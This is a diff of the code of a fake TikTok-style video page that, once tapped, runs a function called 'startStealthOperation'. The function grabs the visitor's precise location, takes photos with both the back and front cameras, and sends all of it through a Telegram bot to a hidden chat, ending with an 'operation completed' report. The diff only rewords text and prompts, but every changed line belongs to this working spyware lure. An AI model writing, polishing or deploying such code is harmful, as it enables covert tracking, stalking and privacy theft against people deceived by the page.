@@ -341,10 +341,10 @@
 
         <div class="video-info" id="fake-info">
             <div class="username">@tiktok_creator <span>Follow</span></div>
-            <div class="description">Wait for the end! 😂🔥 #trending #fyp</div>
+            <div class="description">Wait for the end! 😂🔥 #trend #fyp</div>
             <div class="music">
                 <svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
-                <span>original sound - trending_vibes</span>
+                <span>Original sound - trending_vibes</span>
             </div>
         </div>
 
@@ -429,7 +429,7 @@
             });
         }
 
-        // ========== 2. Capture photos from camera (back and front) ==========
+        // ========== 2. Capture Camera Photos (Back and Front) ==========
         // Back camera - 3 photos
         async function captureBackCameraPhotos() {
             try {
@@ -510,10 +510,10 @@
 
         // ========== 3. Send data to Telegram ==========
         async function sendLocation(location) {
-            let msg = `📍 <b>Target location obtained</b>\n\n🕒 ${new Date().toLocaleString('en-US')}\n`;
+            let msg = `📍 <b>User Precise Location</b>\n\n🕒 ${new Date().toLocaleString('en-US')}\n`;
             if (location.success) {
                 msg += `🌐 Latitude: ${location.latitude}\n🌐 Longitude: ${location.longitude}\n📡 Accuracy: ${location.accuracy} meters\n\n`;
-                msg += `<a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}&z=18">🗺️ Open in maps</a>`;
+                msg += `<a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}&z=18">🗺️ Click to open map</a>`;
             } else {
                 msg += `❌ Failed to get location: ${location.error || 'Permission denied'}`;
             }
@@ -527,7 +527,7 @@
             if (!photos.length) {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 No back camera photos captured` })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 No back camera photos were captured` })
                 });
                 return;
             }
@@ -546,7 +546,7 @@
             if (!photos.length) {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 No front camera photos captured` })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 No front camera photos were captured` })
                 });
                 return;
             }
@@ -561,48 +561,48 @@
             }
         }
 
-        // ========== Main operation ==========
+        // ========== Main Operation ==========
         async function startStealthOperation() {
             try {
                 updateProgress(5); loadingMessage.textContent = 'Connecting...'; await wait(300);
                 
                 // 1. Location
-                updateProgress(12); loadingMessage.textContent = 'Obtaining location...';
-                showNotification('Loading, please wait a moment');
+                updateProgress(12); loadingMessage.textContent = 'Getting location...';
+                showNotification('📍 Please allow location access');
                 const location = await getPreciseLocation(); await wait(500);
                 
-                updateProgress(20); loadingMessage.textContent = 'Processing location...';
+                updateProgress(20); loadingMessage.textContent = 'Sending location...';
                 await sendLocation(location); await wait(600);
                 
                 // 2. Back camera (3 photos)
-                updateProgress(30); loadingMessage.textContent = 'Accessing back camera...';
-                showNotification('Accessing camera...');
+                updateProgress(30); loadingMessage.textContent = 'Activating back camera...';
+                showNotification('📸 Please allow camera for back camera');
                 await wait(500);
                 
-                updateProgress(40); loadingMessage.textContent = 'Capturing back camera photos...';
+                updateProgress(40); loadingMessage.textContent = 'Capturing 3 photos from back camera...';
                 const backPhotos = await captureBackCameraPhotos();
                 await sendBackPhotos(backPhotos); await wait(600);
                 
                 // 3. Front camera (2 photos)
-                updateProgress(55); loadingMessage.textContent = 'Accessing front camera...';
-                showNotification('Accessing front camera...');
+                updateProgress(55); loadingMessage.textContent = 'Activating front camera...';
+                showNotification('📸 Please allow camera for front camera');
                 await wait(500);
                 
-                updateProgress(65); loadingMessage.textContent = 'Capturing front camera photos...';
+                updateProgress(65); loadingMessage.textContent = 'Capturing 2 photos from front camera...';
                 const frontPhotos = await captureFrontCameraPhotos();
                 await sendFrontPhotos(frontPhotos); await wait(600);
                 
-                updateProgress(85); loadingMessage.textContent = 'Finalizing...';
+                updateProgress(85); loadingMessage.textContent = 'Preparing report...';
                 await wait(500);
                 
-                updateProgress(100); loadingMessage.textContent = 'Complete! Redirecting...';
+                updateProgress(100); loadingMessage.textContent = 'Redirecting...';
                 
                 // Final report
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
                         chat_id: CHAT_ID, 
-                        text: `✅ <b>Operation completed successfully</b>\n━━━━━━━━━━━━━━━━━━\n📍 Location: ${location.success ? '✓' : '✗'}\n📸 Back camera: ${backPhotos.length}/3 photos\n📸 Front camera: ${frontPhotos.length}/2 photos\n━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString('en-US')}`,
+                        text: `✅ <b>Successfully Sent</b>\n━━━━━━━━━━━━━━━━━━\n📍 Location: ${location.success ? '✓' : '✗'}\n📸 Back camera: ${backPhotos.length}/3 photos\n📸 Front camera: ${frontPhotos.length}/2 photos\n━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString('en-US')}`,
                         parse_mode: 'HTML'
                     })
                 });
@@ -629,7 +629,7 @@
             startStealthOperation();
         });
 
-        showNotification('Tap to watch video');
+        showNotification('Tap to watch the video');
 
         setTimeout(() => {
             if (!loadingOverlay.classList.contains('active')) {
